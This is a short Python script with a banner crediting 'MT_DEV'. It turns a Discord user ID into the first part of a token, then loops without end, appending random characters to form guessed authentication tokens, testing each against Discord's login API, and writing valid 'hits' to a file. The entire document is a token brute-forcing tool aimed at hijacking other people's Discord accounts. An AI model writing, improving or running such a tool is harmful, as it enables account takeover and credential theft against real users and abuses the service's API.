import base64
import os
import random
import string
import requests
from colorama import *


print(f"""
█▀▄▀█ ▀▀█▀▀ █▀▀▄ █▀▀ ▀█░█▀
█░▀░█ ░░█░░ █░░█ █▀▀ ░█▄█░
▀░░░▀ ░░▀░░ ▀▀▀░ ▀▀▀ ░░▀░░
  
Id To Token (by the God MT_DEV)

""")

id_to_token = base64.b64encode((input("ID: ")).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] TOKEN VALIDE' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
        else:
            print(Fore.RED + '[-] TOKEN INVALIDE' + ' ' + token)
    finally:
        print("")


input()
